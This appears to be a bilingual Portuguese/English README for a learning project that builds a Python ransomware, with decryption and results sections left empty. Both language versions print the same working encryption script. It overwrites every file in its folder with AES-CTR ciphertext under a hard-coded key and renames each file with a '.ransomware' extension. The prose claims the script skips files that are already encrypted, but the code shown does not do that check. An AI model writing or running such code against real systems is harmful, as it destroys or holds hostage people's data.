# Projeto em Python de um Ransomware (PT-BR)

### Funcionamento

- O intuito deste projeto é criar um Ransomware que criptografe arquivos presentes na pasta onde o Malware está.

- Este Ransomware é dividido em dois executaveis, um deles terá a função de criptografar os arquivos e o outro terá o objetivo de descriptografa-los futuramente.

### Código de Criptografia

- O executavel abre todos os arquivos presentes na pasta onde ele se encontra, verificando se já não estão criptografados ou se não são os próprios executaveis.

- Após abrir cada arquivo presente na pasta ele copia os dados e os criptografa, reescrevendo em seguida o arquivo. Ele também substitui a estenção do arquivo para ".ransomware".

```python
import os
import pyaes

for name in os.listdir("./"):
    if name != "decrypt.py" and name != "encrypt.py":
        with open(name, "rb") as file:
            file_data = file.read()

        key = b"secretencryptkey"
        aes = pyaes.AESModeOfOperationCTR(key)

        data_encrypt = aes.encrypt(file_data)

        with open(name, "wb") as file:
            file.write(data_encrypt)

        os.rename("./{}".format(name), "./{}.ransomware".format(name))
```

- A chave de criptografia utilizada foi "secretencryptkey", essa chave será utilizada futuramente durante a descriptografia.

### Código de Descriptografia

- 

### Resultados

- 

# Ransomware Project in Python (EN-US)

### Functionality

- The purpose of this project is to create a Ransomware that encrypts files present in the folder where the Malware is.

- This Ransomware is divided into two executables, one of which will have the function of encrypting the files and the other will have the purpose of decrypting them in the future.

### Encryption Code

- The executable opens all the files in the folder where it is located, checking whether they are already encrypted or whether they are not the executables themselves.

- After opening each file in the folder, it copies the data and encrypts it and then rewrites the file. It also replaces the file extension with ".ransomware".

```python
import os
import pyaes

for name in os.listdir("./"):
    if name != "decrypt.py" and name != "encrypt.py":
        with open(name, "rb") as file:
            file_data = file.read()

        key = b"secretencryptkey"
        aes = pyaes.AESModeOfOperationCTR(key)

        data_encrypt = aes.encrypt(file_data)

        with open(name, "wb") as file:
            file.write(data_encrypt)

        os.rename("./{}".format(name), "./{}.ransomware".format(name))
```

- The encryption key used was "secretencryptkey", this key will be used later during decryption.

### Decryption Code

- 

### Results

- 
